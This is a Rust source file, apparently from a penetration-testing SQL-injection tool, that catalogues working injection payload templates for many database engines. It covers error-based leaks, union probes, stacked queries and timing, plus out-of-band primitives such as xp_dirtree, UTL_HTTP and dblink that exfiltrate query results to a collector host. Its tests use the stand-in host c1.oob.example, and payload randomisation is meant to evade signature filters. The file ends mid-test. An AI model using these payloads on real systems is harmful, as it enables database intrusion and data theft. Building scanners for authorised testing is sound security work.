//! Dialect-rendered vector catalogue: the payload breadth layer.
//!
//! A vector is a *primitive* (a conditional-error coercion, a delay, a boolean
//! inference, a stacked statement, an inline subquery, an out-of-band lookup)
//! rendered through a [`DialectProfile`]. Breadth therefore scales with
//! engines instead of with hand-written strings: sqlmap carries 375 literal
//! `<payload>` entries in XML, and every one of its per-engine primitives has
//! a typed counterpart here, plus primitives sqlmap does not ship.
//!
//! Two rules are enforced by construction:
//!
//! 1. **No vector is invented.** Every template below is a real construct for
//!    that engine family — the comment on each primitive names the mechanism
//!    (e.g. MySQL `GTID_SUBSET` echoing its argument in ER_GTID_UNKNOWN_SID,
//!    Oracle `CTXSYS.DRITHSX.SN` raising ORA-20000 with its argument).
//! 2. **Nothing is sent blind.** Every primitive carries an
//!    [`EvidenceGate`]; the composer only emits gated vectors after the
//!    evidence that unlocks them exists.

use crate::detection::DbmsFamily;
use crate::dialects::{profile, ConcatStyle, DelayPrimitive, DialectProfile};
use serde::{Deserialize, Serialize};

/// Opening delimiter wrapped around a leaked value.
pub const LEAK_OPEN: &str = "qpvzq";
/// Closing delimiter wrapped around a leaked value.
pub const LEAK_CLOSE: &str = "qkxbq";

/// Which channel a vector proves something through.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum VectorChannel {
    /// The query result appears inside an error message.
    ErrorExtraction,
    /// The response is delayed iff the predicate holds.
    Timing,
    /// The response differs between a true and a false arm.
    Boolean,
    /// The query result appears in the response body.
    Union,
    /// A second statement executes.
    Stacked,
    /// A subquery result is rendered into the page.
    Inline,
    /// The engine makes an outbound request that we can observe.
    OutOfBand,
}

impl VectorChannel {
    pub fn label(&self) -> &'static str {
        match self {
            Self::ErrorExtraction => "error_extraction",
            Self::Timing => "timing",
            Self::Boolean => "boolean",
            Self::Union => "union",
            Self::Stacked => "stacked",
            Self::Inline => "inline",
            Self::OutOfBand => "out_of_band",
        }
    }
}

/// What must already be true before a vector may be sent.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EvidenceGate {
    /// Cheap, unambiguous, and safe during recon.
    Always,
    /// Needs a prior differential on the same parameter (the parameter is
    /// already known to influence the query).
    AfterSignal,
    /// Needs the engine to be named by fingerprinting before a
    /// dialect-specific primitive is worth spending a request on.
    AfterFingerprint,
    /// Needs an out-of-band collector the operator has authorised.
    RequiresCollector,
}

impl EvidenceGate {
    pub fn label(&self) -> &'static str {
        match self {
            Self::Always => "always",
            Self::AfterSignal => "after_signal",
            Self::AfterFingerprint => "after_fingerprint",
            Self::RequiresCollector => "requires_collector",
        }
    }
}

/// A primitive vector template.
///
/// Placeholders, expanded by [`expand`]:
///
/// | token      | meaning                                              |
/// |------------|------------------------------------------------------|
/// | `{Q}`      | inner query, e.g. `SELECT version()`                 |
/// | `{L}`      | inner query wrapped in the engine's concat + markers |
/// | `{N}`/`{N2}`| matched arithmetic operands (never `1`)             |
/// | `{S}`      | nominal delay in seconds                             |
/// | `{C}`      | column count                                         |
/// | `{COND}`   | boolean condition (true arm / false arm)             |
/// | `{DELAY}`  | the engine's delay expression for `{S}`              |
/// | `{H}`      | heavy-query body for `SELECT count(*) FROM {H}`      |
/// | `{AGG}`    | row-aggregating expression, `%s` = column           |
/// | `{HOST}`   | out-of-band collector host                           |
/// | `{TERM}`   | the engine's line terminator                         |
pub struct Primitive {
    pub slug: &'static str,
    /// `error`, `time`, `boolean`, `union`, `stacked`, `inline`, `oob`.
    pub channel: VectorChannel,
    pub template: &'static str,
    pub gate: EvidenceGate,
    /// The observed mechanism, for the UI and for review.
    pub mechanism: &'static str,
}

/// An engine-specific, gated, rendered vector.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Vector {
    /// Stable id: `<engine>:<channel>:<slug>`.
    pub id: String,
    /// Set for boolean arms so the true/false pair stays paired.
    pub pair_id: Option<String>,
    pub channel: VectorChannel,
    pub dbms: DbmsFamily,
    pub gate: EvidenceGate,
    /// Rendered SQL, before boundary wrapping.
    pub sql: String,
    pub mechanism: String,
}

/// Inputs a vector needs to render.
#[derive(Debug, Clone)]
pub struct VectorContext {
    /// Inner query whose result should be leaked, e.g. `SELECT version()`.
    pub query: String,
    pub seconds: u32,
    pub columns: usize,
    pub host: String,
    /// Which arm of a boolean pair this render is: `true` renders the matched
    /// equality arm, `false` the mismatched one. Never the literal `1=1`/`1=2`.
    pub truth: bool,
}

/// The engine's delay expression for a nominal `seconds`, or an empty string
/// when the engine has no primitive (the heavy-query fallback is used then).
pub fn delay_expression(p: &DialectProfile, seconds: u32) -> String {
    match p.delay {
        DelayPrimitive::Sleep => format!("SLEEP({seconds})"),
        DelayPrimitive::PgSleep => format!("pg_sleep({seconds})"),
        DelayPrimitive::WaitForDelay => format!("WAITFOR DELAY '0:0:{seconds}'"),
        DelayPrimitive::DbmsPipe => format!("DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds})"),
        DelayPrimitive::ClickHouseSleep => format!("sleep({seconds})"),
        DelayPrimitive::None => String::new(),
    }
}

/// The inner query wrapped in the engine's concatenation and the leak markers.
pub fn leak_wrap(p: &DialectProfile, query: &str) -> String {
    match p.concat {
        ConcatStyle::Pipes => format!("'{LEAK_OPEN}'||({query})||'{LEAK_CLOSE}'"),
        ConcatStyle::Plus => format!("'{LEAK_OPEN}'+({query})+'{LEAK_CLOSE}'"),
        ConcatStyle::ConcatFn => format!("CONCAT('{LEAK_OPEN}',({query}),'{LEAK_CLOSE}')"),
        // No concatenation operator: leak the bare query and let the error
        // text carry whatever the engine chooses to echo.
        ConcatStyle::None => format!("({query})"),
    }
}

/// The marker/query/marker argument list, for templates that need to add
/// further `CONCAT` arguments (MySQL's `FLOOR(RAND(0)*2)` vectors).
fn concat_list(p: &DialectProfile, query: &str) -> String {
    if p.concat == ConcatStyle::ConcatFn {
        format!("'{LEAK_OPEN}',({query}),'{LEAK_CLOSE}'")
    } else {
        leak_wrap(p, query)
    }
}

/// Expand a primitive template.
///
/// `{N}`/`{N2}` are derived fresh per call, so two runs of the same vector are
/// never textually identical — a signature filter cannot pin the payload, and
/// a "seen before" cache cannot mask a real difference.
fn expand(template: &str, p: &DialectProfile, ctx: &VectorContext) -> String {
    let n = crate::payload::generate::evasive_operand();
    let nulls = vec!["NULL"; ctx.columns.max(1)].join(",");
    let pads = if ctx.columns > 1 {
        format!(
            "{},{}",
            leak_wrap(p, &ctx.query),
            vec!["NULL"; ctx.columns - 1].join(",")
        )
    } else {
        leak_wrap(p, &ctx.query)
    };
    // Per-column sentinels for column-position discovery: each column carries a
    // distinct marker, so whichever one appears in the response names the
    // reflected column — the position to place an extraction in. The base
    // operand is fresh per call, so the payload stays textually unique.
    let marks = (0..ctx.columns.max(1))
        .map(|i| format!("'{}{}{}'", LEAK_OPEN, n.wrapping_add(i as u32), LEAK_CLOSE))
        .collect::<Vec<_>>()
        .join(",");
    let out = template.replace("{PADS}", &pads);
    let out = out.replace("{MARKS}", &marks);
    let out = out.replace("{N2}", &n.wrapping_add(1).to_string());
    let out = out.replace("{N}", &n.to_string());
    let out = out.replace("{COND}", &crate::payload::generate::evasive_equality(ctx.truth));
    let out = out.replace("{NULLS}", &nulls);
    let out = out.replace("{W}", &concat_list(p, &ctx.query));
    let out = out.replace("{L}", &leak_wrap(p, &ctx.query));
    let out = out.replace("{Q}", &ctx.query);
    let out = out.replace("{S}", &ctx.seconds.to_string());
    let out = out.replace("{DELAY}", &delay_expression(p, ctx.seconds));
    let out = out.replace("{C}", &ctx.columns.to_string());
    let out = out.replace("{H}", p.heavy_body);
    let out = out.replace("{AGG}", p.aggregate);
    let out = out.replace("{HOST}", &ctx.host);
    out.replace("{TERM}", p.terminator)
}

/// Render one primitive into a gated vector.
pub fn render_primitive(p: &DialectProfile, prim: &Primitive, ctx: &VectorContext) -> Vector {
    Vector {
        id: format!("{}:{}:{}", p.dbms.label(), prim.channel.label(), prim.slug),
        pair_id: None,
        channel: prim.channel,
        dbms: p.dbms,
        gate: prim.gate,
        sql: expand(prim.template, p, ctx),
        mechanism: prim.mechanism.to_string(),
    }
}

// ── error-based extraction primitives ──────────────────────────────────────
//
// Every one coerces the engine into repeating the query result inside its own
// error text. The `mechanism` field names the error the engine raises.

/// MySQL/MariaDB error primitives: sqlmap's ten, plus `GTID_SUBTRACT`.
const MYSQL_ERROR: &[Primitive] = &[
    Primitive {
        slug: "gtid-subset",
        channel: VectorChannel::ErrorExtraction,
        template: "AND GTID_SUBSET(CONCAT({W}),{N})",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "GTID_SUBSET() rejects a malformed GTID set with ER_GTID_UNKNOWN_SID, echoing it (~200 characters, so fewer requests per byte than EXTRACTVALUE)",
    },
    Primitive {
        slug: "gtid-subtract",
        channel: VectorChannel::ErrorExtraction,
        template: "AND GTID_SUBTRACT(CONCAT({W}),{N})",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "GTID_SUBTRACT() reports a malformed GTID set specification and echoes it (ours; sqlmap has no GTID_SUBTRACT vector)",
    },
    Primitive {
        slug: "uuid-to-bin",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=UUID_TO_BIN(CONCAT({W}))",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "UUID_TO_BIN() rejects a malformed UUID and echoes it (MySQL >= 8.0)",
    },
    Primitive {
        slug: "extractvalue",
        channel: VectorChannel::ErrorExtraction,
        template: "AND EXTRACTVALUE({N},CONCAT('\\\\',{L}))",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "EXTRACTVALUE() reports an invalid XPath expression and echoes it (MySQL >= 5.1)",
    },
    Primitive {
        slug: "updatexml",
        channel: VectorChannel::ErrorExtraction,
        template: "AND UPDATEXML({N},CONCAT('.',{L}),{N2})",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "UPDATEXML() reports an invalid XPath patch and echoes it (MySQL >= 5.1)",
    },
    Primitive {
        slug: "bigint-unsigned",
        channel: VectorChannel::ErrorExtraction,
        template: "AND (SELECT 2*(IF((SELECT * FROM (SELECT {L})s),18446744073709551610,18446744073709551610)))",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "BIGINT UNSIGNED out of range: the doubled value overflows the type and is echoed (MySQL >= 5.5)",
    },
    Primitive {
        slug: "exp-overflow",
        channel: VectorChannel::ErrorExtraction,
        template: "AND EXP(~(SELECT * FROM (SELECT {L})x))",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "EXP() overflow: the negated string expression overflows a DOUBLE and is echoed (MySQL >= 5.5)",
    },
    Primitive {
        slug: "json-keys",
        channel: VectorChannel::ErrorExtraction,
        template: "AND JSON_KEYS((SELECT CONVERT(({L}) USING utf8)))",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "JSON_KEYS() reports an invalid JSON document and echoes the input (MySQL >= 5.7.8)",
    },
    Primitive {
        slug: "floor-group-by",
        channel: VectorChannel::ErrorExtraction,
        template: "AND (SELECT {N} FROM(SELECT COUNT(*),CONCAT({W},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Duplicate grouped key: FLOOR(RAND(0)*2) makes the key unstable, so the duplicate-entry error echoes the concatenated value (MySQL >= 5.0)",
    },
    Primitive {
        slug: "floor-row-compare",
        channel: VectorChannel::ErrorExtraction,
        template: "AND ROW({N},{N2})>(SELECT COUNT(*),CONCAT({W},FLOOR(RAND(0)*2))x FROM (SELECT {N} UNION SELECT {N2} UNION SELECT {N} UNION SELECT {N2})a GROUP BY x)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Row-subquery comparison against an unstable grouped key (MySQL >= 4.1, pre-5.0 fallback)",
    },
    Primitive {
        slug: "floor-having",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N} GROUP BY CONCAT({W},FLOOR(RAND(0)*2)) HAVING MIN(0)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "GROUP BY/HAVING collision with no subquery wrapper (MySQL, ORDER BY/GROUP BY positions)",
    },
]; // end MYSQL_ERROR

/// T-SQL family error primitives (MSSQL and Sybase share them).
const TSQL_ERROR: &[Primitive] = &[
    Primitive {
        slug: "convert-int",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CONVERT(INT,(SELECT {L}))",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "CONVERT(INT, <string>) raises \"Conversion failed when converting the varchar value '<value>' to data type int\", quoting the value in full (~200 characters)",
    },
    Primitive {
        slug: "cast-int",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CAST((SELECT {L}) AS int)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "The same conversion error through CAST, for filters that block CONVERT",
    },
    Primitive {
        slug: "in-clause",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N} IN (SELECT ({L}))",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Type mismatch on IN() against a string subquery reports the operand",
    },
    Primitive {
        slug: "concat",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CONCAT({W})",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "String-to-int comparison of a CONCAT() result reports the concatenated value",
    },
    Primitive {
        slug: "subselect-inline",
        channel: VectorChannel::ErrorExtraction,
        template: "(SELECT {L})",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Parameter replacement: the subquery *is* the value, so the application's own int cast reports it",
    },
    Primitive {
        slug: "declare-exec",
        channel: VectorChannel::ErrorExtraction,
        template: ";DECLARE @x NVARCHAR(4000);SET @x=(SELECT {L});EXEC @x",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Stacked DECLARE/EXEC: the leaked string is executed as a batch, so the engine reports it as unknown syntax",
    },
]; // end TSQL_ERROR

/// PostgreSQL error primitives. `JSONB`, `XMLPARSE` and the plain int cast are
/// ours; sqlmap ships only the NUMERIC and REGCLASS casts.
const PG_ERROR: &[Primitive] = &[
    Primitive {
        slug: "cast-numeric",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CAST({L} AS NUMERIC)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Invalid input syntax for type numeric, quoting the value",
    },
    Primitive {
        slug: "cast-regclass",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CAST({L} AS REGCLASS)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "A REGCLASS resolution failure quotes the relation name it was given",
    },
    Primitive {
        slug: "cast-int",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CAST({L} AS int)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Invalid input syntax for type integer",
    },
    Primitive {
        slug: "jsonb",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CAST(JSONB_BUILD_OBJECT('{N}',{L})->>'{N}' AS NUMERIC)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "JSONB round-trip into a NUMERIC cast, so the numeric error carries the JSON value (PostgreSQL >= 9.4)",
    },
    Primitive {
        slug: "xmlparse",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CAST(XMLPARSE(DOCUMENT {L}) AS NUMERIC)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "Malformed XML is rejected with the offending text, then cast to NUMERIC (ours; sqlmap has no PostgreSQL XML vector)",
    },
]; // end PG_ERROR

/// Oracle error primitives.
const ORACLE_ERROR: &[Primitive] = &[
    Primitive {
        slug: "ctxsys-sn",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=CTXSYS.DRITHSX.SN({N},{L})",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "CTXSYS.DRITHSX.SN raises ORA-20000 and echoes its second argument",
    },
    Primitive {
        slug: "xmltype",
        channel: VectorChannel::ErrorExtraction,
        template: "AND {N}=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||{L}||CHR(62))) FROM DUAL)",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "XMLType rejects the tagged string with an LPX-00xxx error that echoes it",
    },
    Primitive {
        slug: "utl-inaddr",
        channel: VectorChannel::ErrorExtraction,
        template: "AND (SELECT UTL_INADDR.GET_HOST_ADDRESS({L}) FROM DUAL) IS NOT NULL",
        gate: EvidenceGate::AfterFingerprint,
        mechanism: "UTL_INADDR.GET_HOST_ADDRESS reports an invalid host and echoes it (ours; sqlmap uses UTL_INADDR only for OOB)",
    },
]; // end ORACLE_ERROR

// ── error primitives for the remaining engines ─────────────────────────────

/// Firebird. `BIN_SHL` is sqlmap's primitive; the subquery form is the
/// parameter-replacement variant.
const FIREBIRD_ERROR: &[Primitive] = &[
    err("bin-shl", "AND {N}=BIN_SHL(CAST({L} AS BIGINT),1)", "BIN_SHL on a non-numeric operand raises a conversion error quoting the value"),
    err("subselect-equality", "(SELECT {N}=({L}))", "Parameter replacement: the boolean subquery result is rejected by the application's own type handling, echoing the value"),
];

/// MonetDB. `ms_trunc` over a DECIMAL cast.
const MONETDB_ERROR: &[Primitive] = &[
    err("ms-trunc-decimal", "AND {N}=(SELECT ms_trunc(CAST({L} AS DECIMAL),1))", "ms_trunc on a non-numeric DECIMAL cast reports the value it could not truncate"),
];

/// Vertica. `ZEROIFNULL` forces a NUMERIC cast that cannot fail silently.
const VERTICA_ERROR: &[Primitive] = &[
    err("zeroifnull-numeric", "AND {N}=ZEROIFNULL(CAST({L} AS NUMERIC))", "ZEROIFNULL forces a NUMERIC cast whose failure quotes the value"),
];

/// InterSystems Cache. `TO_POSIXTIME(TO_DATE(...))`.
const CACHE_ERROR: &[Primitive] = &[
    err("to-posixtime", "AND {N}=TO_POSIXTIME(TO_DATE({L},'YYYY'))", "TO_DATE with a format mask raises an error echoing the offending input"),
];

/// CUBRID. `INET_ATON` on a non-address string.
const CUBRID_ERROR: &[Primitive] = &[
    err("inet-aton", "AND {N}=INET_ATON({L})", "INET_ATON reports an invalid IP address and echoes it"),
];

/// Virtuoso. `bit_shift` over an INTEGER cast.
const VIRTUOSO_ERROR: &[Primitive] = &[
    err("bit-shift-int", "AND {N}=bit_shift(CAST({L} AS INTEGER),1)", "bit_shift on a non-numeric cast reports the value"),
];

/// ClickHouse. Strict typing makes a String/Numeric comparison fail loudly, and
/// `getSetting` names the unknown setting it was given.
const CLICKHOUSE_ERROR: &[Primitive] = &[
    err("nullable-string-eq", "AND {N}=({L})", "ClickHouse's strict typing rejects a String/Numeric comparison and names both sides"),
    err("get-setting", "AND {N}=getSetting({L})", "getSetting() reports an unknown setting and echoes its name"),
];

/// Spanner. `ERROR()` is GoogleSQL's explicit raise.
const SPANNER_ERROR: &[Primitive] = &[
    err("error-fn", "AND ERROR({L}) IS NOT NULL", "ERROR() raises with our string as the message, so the value returns verbatim"),
];

/// Presto/Trino. `PARSE_DATA_SIZE` rejects anything that is not a size.
const PRESTO_ERROR: &[Primitive] = &[
    err("parse-data-size", "AND {N}=PARSE_DATA_SIZE({L})", "PARSE_DATA_SIZE raises INVALID_FUNCTION_ARGUMENT quoting the value"),
];

/// SAP MaxDB. `TO_NUMBER` over a formatted string.
const MAXDB_ERROR: &[Primitive] = &[
    err("to-number", "AND {N}=TO_NUMBER({L})", "TO_NUMBER reports the character it could not convert"),
];

/// Microsoft Access. The Jet/ACE conversion error quotes the value, but the
/// exact message is driver-dependent.
const ACCESS_ERROR: &[Primitive] = &[
    err("cint-conversion", "AND {N}=CINT({L})", "CINT() type mismatch reports the offending value in the Jet/ACE error text"),
];

/// DB2, H2, HSQLDB, Informix, SAP HANA and SQLite all leak through a
/// character-to-integer cast, with engine-specific wording.
const CAST_INT_ERROR: &[Primitive] = &[
    err("cast-int", "AND {N}=CAST({L} AS int)", "Character-to-numeric cast failure; the engine's error quotes the value (DB2 / H2 / HSQLDB / Informix / HANA / SQLite class)"),
];

/// SQLite's `JSON()` reports malformed input and includes it.
const SQLITE_ERROR: &[Primitive] = &[
    err("json-malformed", "AND {N}=JSON({L})", "JSON() reports a malformed JSON document and echoes the input"),
];

/// The portable fallback for an engine we cannot fingerprint. Gated on a prior
/// signal, because once the engine is known an engine-specific primitive is
/// always the better bet.
const GENERIC_ERROR: &[Primitive] = &[v(
    "cast-int-generic",
    VectorChannel::ErrorExtraction,
    "AND {N}=CAST({L} AS int)",
    EvidenceGate::AfterSignal,
    "Portable cast failure: last resort when the engine is unknown",
)];

// ── union primitives ───────────────────────────────────────────────────────

const UNION_PROBES: &[Primitive] = &[
    u("null-pad", "UNION SELECT {NULLS}", "Column-count discovery: an all-NULL projection of the right width type-checks against any column list"),
    u("union-all-null-pad", "UNION ALL SELECT {NULLS}", "UNION ALL keeps a duplicate injected row that the implicit DISTINCT of a bare UNION would fold away, and defeats a filter keyed on the exact `UNION SELECT` sequence"),
    u("sentinel-single", "UNION SELECT {L}", "Sentinel-wrapped single-column extraction: the markers appear in the body iff our projection was rendered"),
    u("sentinel-pad", "UNION SELECT {PADS}", "Sentinel in the first column with NULL padding for the rest — the shape that works once the width is known"),
    u("position-markers", "UNION SELECT {MARKS}", "Per-column sentinels: each column carries a distinct marker, so the one echoed in the response identifies which column position is reflected — the position to carry an extraction"),
    u("order-by-count", "ORDER BY {C}", "Column-count discovery by sorting on the Nth column: an index error appears exactly above the real width"),
];

// ── stacked primitives (read-only) ─────────────────────────────────────────

const READ_ONLY_STACKED: &[Primitive] = &[
    st("select-marker", ";SELECT {N}", "Confirms multi-statement batching with a read-only statement — never a write or a DDL"),
    st("call-conditional-heavy", ";CALL CASE WHEN {COND} THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR({N}),0),{S}00000000),NULL) END", "HSQLDB: CALL with a conditional CPU burn (sqlmap's stacked primitive)"),
];

// ── inline primitives ──────────────────────────────────────────────────────

const INLINE_SUBQUERY: &[Primitive] = &[
    inl("subselect", "(SELECT {L})", "The subquery replaces the parameter value entirely, so a reflected or type-cast value leaks"),
    inl("from-single-row", "SELECT {L} FROM RDB$DATABASE", "Firebird's single-row system table makes an inline SELECT selectable"),
    inl("bare-parens", "({L})", "Parenthesised scalar expression (ClickHouse and other engines accept a bare scalar in place)"),
];

// ── out-of-band primitives ─────────────────────────────────────────────────

/// MySQL on Windows: a UNC path makes the OS resolve the hostname.
const MYSQL_OOB: &[Primitive] = &[oob(
    "load-file-unc",
    r"AND LOAD_FILE(CONCAT('\\',(SELECT {Q}),'.{HOST}\a'))",
    "LOAD_FILE on a UNC path makes the operating system resolve a hostname we control (Windows MySQL)",
)];

/// MSSQL: `xp_dirtree` walks a UNC path and resolves the host.
const TSQL_OOB: &[Primitive] = &[oob(
    "xp-dirtree-unc",
    r"';DECLARE @h NVARCHAR(1024);SET @h='\\'+(SELECT {Q})+'.{HOST}\a';EXEC master..xp_dirtree @h",
    "xp_dirtree resolves and connects to a UNC path, producing a DNS/SMB interaction we can observe",
)];

/// Oracle: two independent outbound primitives.
const ORACLE_OOB: &[Primitive] = &[
    oob("utl-inaddr-resolve", "AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT {Q})||'.{HOST}') FROM DUAL) IS NOT NULL", "UTL_INADDR resolves a crafted hostname with no elevated privilege"),
    oob("utl-http-request", "AND UTL_HTTP.REQUEST('http://'||(SELECT {Q})||'.{HOST}/') IS NOT NULL", "UTL_HTTP makes an outbound HTTP request that appears in our collector's log"),
];

/// PostgreSQL: `dblink` opens a connection, which resolves the host.
const PG_OOB: &[Primitive] = &[oob(
    "dblink-connect",
    "AND (SELECT 1 FROM dblink('host='||(SELECT {Q})||'.{HOST} user=x dbname=x','SELECT 1') AS t(x int)) IS NOT NULL",
    "dblink attempts an outbound connection and resolves the hostname (requires the extension to be installed — a probe, not an assumption)",
)];

#[cfg(test)]
mod catalogue_tests {
    use super::*;

    fn ctx_for(dbms: DbmsFamily) -> VectorContext {
        let mut ctx = VectorContext::default();
        ctx.query = "SELECT 1".to_string();
        ctx.host = "c1.oob.example".to_string();
        ctx.seconds = 5;
        ctx.columns = 3;
        let _ = dbms;
        ctx
    }

    #[test]
    fn stacked_vectors_only_exist_where_the_grammar_allows_them() {
        for dbms in [
            DbmsFamily::Oracle,
            DbmsFamily::DB2,
            DbmsFamily::Informix,
            DbmsFamily::Firebird,
        ] {
            assert!(
                vectors_for(dbms, VectorChannel::Stacked, &ctx_for(dbms)).is_empty(),
                "{dbms:?} must not get a stacked vector"
            );
        }
        let vectors = vectors_for(DbmsFamily::MSSQL, VectorChannel::Stacked, &ctx_for(DbmsFamily::MSSQL));
        assert!(!vectors.is_empty());
        assert!(vectors.iter().all(|v| v.sql.starts_with(';')));
    }

    #[test]
    fn out_of_band_vectors_always_require_a_collector() {
        for dbms in [
            DbmsFamily::MySQL,
            DbmsFamily::MSSQL,
            DbmsFamily::Oracle,
            DbmsFamily::PostgreSQL,
        ] {
            let vectors = vectors_for(dbms, VectorChannel::OutOfBand, &ctx_for(dbms));
            assert!(!vectors.is_empty(), "{dbms:?} should have an OOB primitive");
            for vector in vectors {
                assert_eq!(vector.gate, EvidenceGate::RequiresCollector);
                assert!(
                    vector.sql.contains("c1.oob.example"),
                    "collector host not substituted: {}",
                    vector.sql
                );
            }
        }
    }

    #[test]
    fn every_vector_declares_a_mechanism_and_renders() {
        for dbms in DbmsFamily::ALL {
            for vector in all_for(*dbms, &ctx_for(*dbms)) {
                assert!(!vector.mechanism.is_empty(), "{} has no mechanism note", vector.id);
                assert!(!vector.sql.is_empty(), "{} rendered empty", vector.id);
            }
        }
    }

    #[test]
    fn the_generic_fallback_is_always_available() {
        // The graceful-degradation property: whatever engine we are handed, an
        // error vector exists even when no engine-specific primitive applies.
        for dbms in DbmsFamily::ALL {
            assert!(
                primitives_for(*dbms, VectorChannel::ErrorExtraction)
                    .iter()
                    .any(|p| p.slug == "cast-int-generic"),
                "{dbms:?} lost the portable fallback"
            );
        }
    }

    #[test]
    fn catalogue_is_larger_than_any_fixed_payload_list() {
        // A fixed list (sqlmap's is 375 entries) cannot grow with the engine
        // count; this catalogue renders per engine, per channel, per style.
        let total = catalogue_total();
        assert!(
            total >= 300,
            "catalogue unexpectedly small: {total} vectors across {} engines",
            DbmsFamily::ALL.len()
        );
    }
}


#[cfg(test)]
mod tests {
    use super::*;

    /// A context whose inner query is the engine's own version expression, so
    /// each test renders what a real run would send.
    fn ctx_for(dbms: DbmsFamily) -> VectorContext {
        let p = profile(dbms);
        VectorContext {
            query: if p.knows_version() {
                format!("SELECT {}", p.version_expr)
            } else {
                "SELECT 1".to_string()
            },
            seconds: 5,
            columns: 3,
            host: "c1.oob.example".to_string(),
            truth: true,
        }
    }

    #[test]
    fn every_engine_has_error_and_boolean_vectors() {
        for dbms in DbmsFamily::ALL {
            let ctx = ctx_for(*dbms);
            assert!(
                !vectors_for(*dbms, VectorChannel::ErrorExtraction, &ctx).is_empty(),
                "{dbms:?} has no error vector"
            );
            let booleans = vectors_for(*dbms, VectorChannel::Boolean, &ctx);
            assert!(!booleans.is_empty(), "{dbms:?} has no boolean vector");
            assert!(
                booleans.iter().all(|v| v.pair_id.is_some()),
                "{dbms:?} produced an unpaired boolean arm"
            );
        }
    }

    #[test]
    fn boolean_arms_are_matched_pairs_never_trivial_tautologies() {
        for dbms in DbmsFamily::ALL {
            let ctx = ctx_for(*dbms);
            let booleans = vectors_for(*dbms, VectorChannel::Boolean, &ctx);
            assert_eq!(booleans.len() % 2, 0, "{dbms:?}: odd number of arms");
            for chunk in booleans.chunks(2) {
                assert_eq!(chunk[0].pair_id, chunk[1].pair_id);
                assert_ne!(chunk[0].sql, chunk[1].sql, "{dbms:?}: both arms identical");
            }
            for vector in &booleans {
                assert!(
                    !vector.sql.contains(" 1=1") && !vector.sql.contains(" 1=2"),
                    "{dbms:?} leaked a trivial tautology: {}",
                    vector.sql
                );
            }
        }
    }

    #[test]
    fn error_vectors_carry_the_leak_markers() {
        for dbms in DbmsFamily::ALL {
            let ctx = ctx_for(*dbms);
            for vector in vectors_for(*dbms, VectorChannel::ErrorExtraction, &ctx) {
                // The portable fallback leaks only through the cast error, so
                // it legitimately has no markers of its own.
                if vector.id.contains("generic") {
                    continue;
                }
                assert!(
                    vector.sql.contains(LEAK_OPEN) && vector.sql.contains(LEAK_CLOSE),
                    "{dbms:?} error vector without markers: {}",
                    vector.sql
                );
            }
        }
    }

    #[test]
    fn timing_uses_the_engine_primitive_and_never_invents_one() {
        let join = |dbms: DbmsFamily| {
            vectors_for(dbms, VectorChannel::Timing, &ctx_for(dbms))
                .iter()
                .map(|v| v.sql.clone())
                .collect::<Vec<_>>()
                .join("\n")
        };
        assert!(join(DbmsFamily::MySQL).contains("SLEEP(5)"));
        assert!(join(DbmsFamily::PostgreSQL).contains("pg_sleep(5)"));
        assert!(join(DbmsFamily::MSSQL).contains("WAITFOR DELAY '0:0:5'"));
        assert!(join(DbmsFamily::Oracle).contains("DBMS_PIPE.RECEIVE_MESSAGE"));
        let sq = join(DbmsFamily::SQLite);
        assert!(sq.contains("RANDOMBLOB"), "SQLite must burn CPU: {sq}");
        assert!(!sq.contains("SLEEP("), "SQLite must not claim a sleep: {sq}");
        // Engine-specific CPU primitives must not leak across engines.
        assert!(
            !sq.contains("REGEXP_SUBSTRING"),
            "SQLite was given HSQLDB's primitive: {sq}"
        );
        let hs = join(DbmsFamily::HSQLDB);
        assert!(hs.contains("REGEXP_SUBSTRING"), "HSQLDB needs its own burn: {hs}");
        assert!(!hs.contains("RANDOMBLOB"), "HSQLDB was given SQLite's primitive: {hs}");
    }

    #[test]
    fn mysql_has_a_benchmark_timing_vector_distinct_from_sleep() {
        // BENCHMARK is a real MySQL-family CPU-burn primitive: a time signal for
